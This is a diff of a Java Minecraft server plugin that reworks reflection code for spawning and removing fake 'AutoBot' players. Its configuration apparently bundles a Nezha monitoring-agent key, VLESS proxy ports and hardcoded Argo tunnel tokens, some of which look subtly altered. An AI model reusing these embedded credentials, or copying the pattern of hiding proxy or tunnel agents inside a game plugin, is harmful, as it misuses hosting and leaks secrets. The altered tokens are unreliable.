@@ -17,6 +17,7 @@ import java.io.OutputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
+import java.net.InetSocketAddress;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URI;
@@ -70,8 +71,8 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
     private static final String NEZHA_KEY = env("NEZHA_KEY", "aVRa8k25KwF4PRDCcr");
 
-    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dNdE9EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
-    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGxoWm1JdE1ERmhaaTAwTnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
+    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZjM0Yjg2ZGItYmE0ZS00NjUyLWI5OTMtNGI3YjMwZjdjNTU0IiwicyI6IlpqZGxNR1ZsT1dMtE0EYzNZUzAwWXpWbUxXRTVOREF0TlRSak4yRTFNVGMyTnpJMiJ9");
+    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "eyJhIjoiYmRiNzUxYWY5NDBiNWM3NGI4MTRiZWNkMzE0MWYwYTUiLCJ0IjoiZmU0ZjJkZjMtOGIxMi00MmRmLWI5YjAtOWUzMGY3MGVkZDM4IiwicyI6Ik9HVTFaRGlhWm1JdE1ERmhaaTAwNnpBMExUZzFORE10WmpNeE1qWXhNek0xWkdaaSJ9");
 
     private static final String WSPORT = env("WSPORT", "8001");
     private static final String VLPORT = env("VLPORT", "8002");
@@ -98,12 +99,12 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     private static final String ARCH = detectArch();
     private static final List<Process> EXTERNAL_PROCESSES = new ArrayList<>();
 
-    // ==================== 【虚拟机器人相关配置】 ====================
+    // ==================== 【虚拟机器人配置】 ====================
     private static final ConcurrentHashMap<String, Object> ACTIVE_BOTS = new ConcurrentHashMap<>();
     private static final boolean AUTO_SPAWN_ENABLE = true;
-    private static final int AUTO_SPAWN_COUNT = 2; 
+    private static final int AUTO_SPAWN_COUNT = 2;
     private static final String AUTO_SPAWN_PREFIX = "AutoBot_";
-    private static final long RESPAWN_DELAY_TICKS = 20 * 20L; // 死亡后 20 秒重新生成
+    private static final long RESPAWN_DELAY_TICKS = 20 * 20L;
 
     @Override
     public void onEnable() {
@@ -148,12 +149,12 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         if (ACTIVE_BOTS.containsKey(botName)) {
             Location respawnLoc = victim.getLocation();
             ACTIVE_BOTS.remove(botName);
-            getLogger().info("[Bot] 假人 " + botName + " 已死亡，将于 20 秒后在原位置重新生成...");
+            getLogger().info("[Bot] 假人 " + botName + " 已死亡，将于 20 秒后重新生成...");
 
             Bukkit.getScheduler().runTaskLater(this, () -> {
                 if (respawnLoc.getWorld() != null) {
                     spawnInternalBot(botName, respawnLoc);
-                    getLogger().info("[Bot] [✔] 假人 " + botName + " 已在 20 秒后成功复活！");
+                    getLogger().info("[Bot] [✔] 假人 " + botName + " 复活成功！");
                 }
             }, RESPAWN_DELAY_TICKS);
         }
@@ -214,7 +215,7 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
     }
 
     /**
-     * 【纯反射创建假人 - 包含 EmbeddedChannel 注入与兼容性回退】
+     * 【Paper 1.21 兼容的假人生成逻辑 - 反射强注入模式】
      */
     public void spawnInternalBot(String botName, Location loc) {
         if (ACTIVE_BOTS.containsKey(botName)) return;
@@ -241,11 +242,11 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             Constructor<?> serverPlayerConst = serverPlayerClass.getConstructor(minecraftServer.getClass(), serverLevel.getClass(), gameProfileClass);
             Object serverPlayer = serverPlayerConst.newInstance(minecraftServer, serverLevel, gameProfile);
 
-            // 5. 反射设置坐标
+            // 5. 设置坐标
             Method moveToMethod = serverPlayerClass.getMethod("moveTo", double.class, double.class, double.class, float.class, float.class);
             moveToMethod.invoke(serverPlayer, loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());
 
-            // 6. 构造 Connection 实例并注入 EmbeddedChannel 防 NPE
+            // 6. 构造 Connection 并注入 Channel 与 Address 防 NPE
             Class<?> packetFlowClass = Class.forName("net.minecraft.network.protocol.PacketFlow");
             @SuppressWarnings("unchecked")
             Object serverboundEnum = Enum.valueOf((Class<Enum>) packetFlowClass, "SERVERBOUND");
@@ -253,13 +254,20 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             Constructor<?> connectionConst = connectionClass.getConstructor(packetFlowClass);
             Object fakeConnection = connectionConst.newInstance(serverboundEnum);
 
-            // 注入 EmbeddedChannel
+            // 注入 Channel
             try {
                 Field channelField = connectionClass.getDeclaredField("channel");
                 channelField.setAccessible(true);
                 Class<?> embeddedChannelClass = Class.forName("io.netty.channel.embedded.EmbeddedChannel");
                 Object dummyChannel = embeddedChannelClass.getDeclaredConstructor().newInstance();
                 channelField.set(fakeConnection, dummyChannel);
+            } catch (Exception ignored) {}
+
+            // 注入 Address
+            try {
+                Field addressField = connectionClass.getDeclaredField("address");
+                addressField.setAccessible(true);
+                addressField.set(fakeConnection, new InetSocketAddress("127.0.0.1", 0));
             } catch (Exception ignored) {}
 
             // 7. 绑定 ServerGamePacketListenerImpl
@@ -270,10 +278,12 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
             Field connField = serverPlayerClass.getField("connection");
             connField.set(serverPlayer, packetListener);
 
-            // 8. 注入 PlayerList (优先 placeNewPlayer，失败回退到 addNewPlayer)
+            // 8. 注入地图实体与 PlayerList 列表中
             Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
             Object playerList = getPlayerListMethod.invoke(minecraftServer);
 
+            // 尝试通过原生逻辑加载，若被 Paper 过滤则进行回退强注
+            boolean loadedSuccess = false;
             try {
                 Class<?> cookieClass = Class.forName("net.minecraft.server.network.CommonListenerCookie");
                 Method clientInfoMethod = serverPlayerClass.getMethod("clientInformation");
@@ -284,16 +294,32 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
 
                 Method placeNewPlayerMethod = playerList.getClass().getMethod("placeNewPlayer", connectionClass, serverPlayerClass, cookieClass);
                 placeNewPlayerMethod.invoke(playerList, fakeConnection, serverPlayer, cookie);
-            } catch (NoSuchMethodException e) {
-                Method addNewPlayerMethod = playerList.getClass().getMethod("addNewPlayer", serverPlayerClass);
-                addNewPlayerMethod.invoke(playerList, serverPlayer);
+                loadedSuccess = true;
+            } catch (Exception ignored) {}
+
+            if (!loadedSuccess) {
+                // 强制将实体放入世界并补充入玩家在线列表
+                try {
+                    Method addNewPlayerMethod = serverLevel.getClass().getMethod("addNewPlayer", serverPlayerClass);
+                    addNewPlayerMethod.invoke(serverLevel, serverPlayer);
+                } catch (Exception e) {
+                    Method addWithUUIDMethod = serverLevel.getClass().getMethod("addWithUUID", Class.forName("net.minecraft.world.entity.Entity"));
+                    addWithUUIDMethod.invoke(serverLevel, serverPlayer);
+                }
+
+                Field playersField = playerList.getClass().getField("players");
+                @SuppressWarnings("unchecked")
+                List<Object> players = (List<Object>) playersField.get(playerList);
+                if (!players.contains(serverPlayer)) {
+                    players.add(serverPlayer);
+                }
             }
 
             ACTIVE_BOTS.put(botName, serverPlayer);
-            getLogger().info("[Bot] [✔] 动态生成虚拟机器人 " + botName + " 成功！");
+            getLogger().info("[Bot] [✔] 成功生成虚拟机器人并加入列表: " + botName);
 
         } catch (Exception e) {
-            getLogger().severe("[Bot] 动态生成假人 " + botName + " 失败: " + e.getMessage());
+            getLogger().severe("[Bot] 生成假人 " + botName + " 失败: " + e.getMessage());
             e.printStackTrace();
         }
     }
@@ -302,15 +328,21 @@ public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Li
         Object fakePlayer = ACTIVE_BOTS.remove(botName);
         if (fakePlayer != null) {
             try {
-                Field connField = fakePlayer.getClass().getField("connection");
-                Object conn = connField.get(fakePlayer);
-                Method disconnectMethod = conn.getClass().getMethod("onDisconnect", Class.forName("net.minecraft.network.chat.Component"));
+                Object craftServer = Bukkit.getServer();
+                Method getServerMethod = craftServer.getClass().getMethod("getServer");
+                Object minecraftServer = getServerMethod.invoke(craftServer);
                 
-                Class<?> componentClass = Class.forName("net.minecraft.network.chat.Component");
-                Method literalMethod = componentClass.getMethod("literal", String.class);
-                Object reason = literalMethod.invoke(null, "Bot Removed");
+                Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
+                Object playerList = getPlayerListMethod.invoke(minecraftServer);
 
-                disconnectMethod.invoke(conn, reason);
+                Field playersField = playerList.getClass().getField("players");
+                @SuppressWarnings("unchecked")
+                List<Object> players = (List<Object>) playersField.get(playerList);
+                players.remove(fakePlayer);
+
+                Method discardMethod = fakePlayer.getClass().getMethod("discard");
+                discardMethod.invoke(fakePlayer);
+
                 return true;
             } catch (Exception ignored) {}
         }
